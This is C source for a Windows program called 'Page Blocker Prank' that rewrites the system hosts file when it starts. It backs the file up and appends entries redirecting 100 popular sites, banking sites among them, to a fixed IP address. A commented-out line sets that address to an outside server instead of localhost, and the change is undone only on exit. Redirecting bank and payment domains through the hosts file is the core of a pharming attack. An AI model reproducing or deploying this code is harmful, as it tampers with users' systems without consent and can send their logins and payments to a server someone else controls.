#define TIMER_PRANK 5

#include <windows.h>
#include <windowsx.h>
#include <tchar.h>
#include "common.h"
#include "resource.h"
		
static ProgData pd;
static BOOL bIsPrankOn = FALSE;
static HWND hStart = NULL;
static HINSTANCE hExe = NULL;

DWORD DoPrank (  );
DWORD UndoPrank (  );

//TCHAR prankbossip [] = TEXT ("64.64.19.82");
TCHAR prankbossip [] = TEXT ("127.0.0.0");

DWORD FileAppendData ( TCHAR *szFileName, TCHAR *szData );
DWORD DoPrank (  );
DWORD UndoPrank ();
DWORD AlterHostsFile ( TCHAR *hosts );

	
DWORD ReadFileData ( TCHAR *szFileName, TCHAR *szData, DWORD dwBufLen );
DWORD FileWrite ( TCHAR *szFileName, TCHAR *szData );
;
static TCHAR title [ ] = TEXT ("Page Blocker Prank v 1.0");
static TCHAR cls [] = TEXT ("PageBlockerv10");
static TCHAR windir [ 1024 ];
static TCHAR rootdir [ 1024];
static TCHAR appdir [ 1024];


TCHAR alexa [ 100 ][ 40 ] = {
TEXT("google.com"),
TEXT("facebook.com"),
TEXT("youtube.com"),
TEXT("yahoo.com"),
TEXT("amazon.com"),
TEXT("wikipedia.org"),
TEXT("twitter.com"),
TEXT("ebay.com"),
TEXT("blogspot.com"),
TEXT("craigslist.org"),
TEXT("linkedin.com"),
TEXT("live.com"),
TEXT("go.com"),
TEXT("msn.com"),
TEXT("bing.com"),
TEXT("espn.go.com"),
TEXT("cnn.com"),
TEXT("paypal.com"),
TEXT("aol.com"),
TEXT("wordpress.com"),
TEXT("apple.com"),
TEXT("t.co"),
TEXT("huffingtonpost.com"),
TEXT("netflix.com"),
TEXT("tumblr.com"),
TEXT("imdb.com"),
TEXT("nytimes.com"),
TEXT("flickr.com"),
TEXT("bankofamerica.com"),
TEXT("weather.com"),
TEXT("zedo.com"),
TEXT("microsoft.com"),
TEXT("about.com"),
TEXT("imgur.com"),
TEXT("chase.com"),
TEXT("godaddy.com"),
TEXT("livejasmin.com"),
TEXT("walmart.com"),
TEXT("foxnews.com"),
TEXT("optmd.com"),
TEXT("secureserver.net"),
TEXT("ask.com"),
TEXT("comcast.net"),
TEXT("wellsfargo.com"),
TEXT("yelp.com"),
TEXT("hulu.com"),
TEXT("reddit.com"),
TEXT("etsy.com"),
TEXT("cnet.com"),
TEXT("pornhub.com"),
TEXT("target.com"),
TEXT("xhamster.com"),
TEXT("pinterest.com"),
TEXT("ehow.com"),
TEXT("reference.com"),
TEXT("nfl.com"),
TEXT("aweber.com"),
TEXT("outbrain.com"),
TEXT("att.com"),
TEXT("googleusercontent.com"),
TEXT("adobe.com"),
TEXT("ups.com"),
TEXT("bestbuy.com"),
TEXT("xvideos.com"),
TEXT("pandora.com"),
TEXT("constantcontact.com"),
TEXT("stumbleupon.com"),
TEXT("groupon.com"),
TEXT("usps.com"),
TEXT("washingtonpost.com"),
TEXT("warriorforum.com"),
TEXT("bbc.co.uk"),
TEXT("wsj.com"),
TEXT("wordpress.org"),
TEXT("vimeo.com"),
TEXT("salesforce.com"),
TEXT("rr.com"),
TEXT("drudgereport.com"),
TEXT("match.com"),
TEXT("photobucket.com"),
TEXT("verizonwireless.com"),
TEXT("cbssports.com"),
TEXT("myspace.com"),
TEXT("pof.com"),
TEXT("indeed.com"),
TEXT("answers.com"),
TEXT("youporn.com"),
TEXT("thepiratebay.org"),
TEXT("tmz.com"),
TEXT("usatoday.com"),
TEXT("latimes.com"),
TEXT("cj.com"),
TEXT("dailymail.co.uk"),
TEXT("amazonaws.com"),
TEXT("coupons.com"),
TEXT("fedex.com"),
TEXT("swagbucks.com"),
TEXT("avg.com"),
TEXT("abcnews.go.com"),
TEXT("mywebsearch.com")
};

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
    {
	MSG msg;
    hExe = hInstance;
    lstrcpy ( pd.cls, cls );
    lstrcpy ( pd.title, title );
	MyRegisterClass(hInstance, &pd);

	if (!InitInstance (hInstance, nCmdShow, &pd))
        return FALSE;

	while (GetMessage(&msg, NULL, 0, 0))
        {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        }

	return (int) msg.wParam;
    }


LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
    {

    DWORD ret;
    static TCHAR *beg = NULL;
    static TCHAR *substr = NULL;
    
	switch (message)
	    {
        case WM_CREATE:
            pd.hDlg = hWnd;
            pd.hCurs = NULL;
            Initialize ( &pd );

           
            GetModuleFileName ( NULL, appdir, 1024 );
            beg = appdir;
            while ( true )
                {
                beg = _tcsstr ( beg, TEXT ("\\"));
                if ( beg!= NULL )
                    {
                    substr = beg;
                    beg += lstrlen ( TEXT("\\"));
                    }
                else
                    break;
                }
            if ( substr != NULL )
                *substr = TEXT ('\0');

            if ( bIsPrankOn == FALSE )
                {
                DoPrank (  );
                bIsPrankOn = TRUE;
                }
            break;

        case WM_USRSYSTRAY:
            switch ( lParam )
                {
                case WM_LBUTTONDBLCLK:
                    ShowAboutDialog ( &pd );
                    break;

                case WM_RBUTTONUP:
                    ShowPopupMenu ( &pd );
                    break;

                case WM_LBUTTONUP:
                    ShowPopupMenu ( &pd );
                    break;
                }
            break;

        
        
        case WM_COMMAND:
            switch (wParam )
                {   
                case IDM_ABOUT:
                    ShowAboutDialog ( &pd );
                    break;
                case IDM_PBOSS:
                    GotoPrankBoss ( &pd );
                    break;

                }
            break;

	    case WM_DESTROY:
            CleanUp ( &pd );
            UndoPrank ();
           
            PostQuitMessage(0);
		    break;
	    default:
		    return DefWindowProc(hWnd, message, wParam, lParam);
	    }
    return 0;
    }


DWORD DoPrank (  )
    {

    OSVERSIONINFO os;
    GetVersionEx ( &os );

    ExpandEnvironmentStrings ( TEXT("%WINDIR%"), windir, 1023 );
    ExpandEnvironmentStrings ( TEXT("%SYSTEMROOT%"), rootdir, 1023 );
    

    

    if ( os.dwMajorVersion < 5 ) 
        {
        lstrcat ( windir, TEXT ("\\hosts"));
        AlterHostsFile ( windir );
        }
    else
        {
        lstrcat ( rootdir, TEXT("\\system32\\drivers\\etc\\hosts"));
        AlterHostsFile ( rootdir );
        }

    //%WinDir%\hosts
    //%SystemRoot%\system32\drivers\etc\hosts


    
    
    //osvinfo.dwMajorVersion

    return 0;
    }

DWORD AlterHostsFile ( TCHAR *hosts )
    {
    
    HANDLE hFile = CreateFile ( TEXT("C:\\hosts"), GENERIC_READ | GENERIC_WRITE, 
				FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE )
        CopyFile ( hosts, TEXT("C:\\hosts"), false );
    else
        CloseHandle ( hFile );

    TCHAR temp [ 64 ];
    
        for ( int i = 0; i < 100; i++ )
            {
            lstrcpy ( temp, prankbossip );
            lstrcat ( temp, TEXT (" " ));
            lstrcat ( temp, alexa [ i ] );
            lstrcat ( temp, TEXT("\x0d\x0a"));
            FileAppendData ( hosts, temp );
            }

        return 0;
    }
    
    

DWORD FileAppendData ( TCHAR *szFileName, TCHAR *szData )
	{
	HANDLE hFile;
	UINT i;
	LONG liTemp = 0;
	DWORD dwTemp = 0;
	hFile = CreateFile ( szFileName, GENERIC_READ | GENERIC_WRITE, 
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, NULL, OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE )
		return 0;
	else
		{
		i = lstrlen ( szData )  * sizeof ( TCHAR );
		SetFilePointer ( hFile, 0, &liTemp, FILE_END );
		WriteFile ( hFile, (PVOID)szData, i, &dwTemp, NULL );
        
		CloseHandle ( hFile );
		}

	return 1;
	}

DWORD UndoPrank (  )
    {
    
    OSVERSIONINFO os;
    GetVersionEx ( &os );
    DWORD memlen = 0;
    DWORD dwTemp = 0;

    ExpandEnvironmentStrings ( TEXT("%WINDIR%"), windir, 1023 );
    ExpandEnvironmentStrings ( TEXT("%SYSTEMROOT%"), rootdir, 1023 );

    HANDLE hFile = CreateFile ( TEXT("C:\\hosts"), GENERIC_READ | GENERIC_WRITE, 
				FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS,
				FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile != INVALID_HANDLE_VALUE )
        {
		memlen = GetFileSize ( hFile, &dwTemp );
        memlen += 128;
        CloseHandle ( hFile );

        static LPVOID mem = VirtualAlloc ( NULL, memlen, MEM_COMMIT, PAGE_READWRITE );
        ReadFileData ( TEXT("C:\\hosts"), (TCHAR *)mem, memlen );
        if ( os.dwMajorVersion < 5 ) 
            {
            lstrcat ( windir, TEXT ("\\hosts"));
            FileWrite ( windir, (TCHAR *)mem);
            }
        else
            {
            lstrcat ( rootdir, TEXT("\\system32\\drivers\\etc\\hosts"));
            FileWrite ( rootdir, (TCHAR *)mem);
            }
        VirtualFree ( mem, 0, MEM_RELEASE );
        }
    
    

    return 0;
    }

DWORD ReadFileData ( TCHAR *szFileName, TCHAR *szData, DWORD dwBufLen )
    {
	HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwRet;
	UINT i;
	LONG liTemp = 0;
	DWORD dwTemp = 0;
	DWORD dwToRead = 0;
	hFile = CreateFile ( szFileName, GENERIC_READ | GENERIC_WRITE, 
				FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL, NULL );
    dwRet = GetLastError ();
	if ( hFile == INVALID_HANDLE_VALUE )
        return 0;
    else
		{
		dwToRead = GetFileSize ( hFile, &dwToRead );
		if ( dwToRead >= dwBufLen )
            {
            return 0;
            }
		SetFilePointer ( hFile, 0, &liTemp, FILE_BEGIN );
		ReadFile ( hFile, (PVOID)szData, dwToRead, &dwTemp, NULL );
		CloseHandle ( hFile );
		}

	return 1;
	}

DWORD FileWrite ( TCHAR *szFileName, TCHAR *szData )
	{
	HANDLE hFile;
	UINT i;
	LONG liTemp = 0;
	DWORD dwTemp = 0;
	hFile = CreateFile ( szFileName, GENERIC_READ | GENERIC_WRITE, 
				FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH, NULL, CREATE_ALWAYS,
				FILE_ATTRIBUTE_NORMAL, NULL );
	if ( hFile == INVALID_HANDLE_VALUE )
		return 0;
	else
		{
		i = lstrlen ( szData )  * sizeof ( TCHAR );
		WriteFile ( hFile, (PVOID)szData, i, &dwTemp, NULL );
		CloseHandle ( hFile );
		}

	return 1;
	}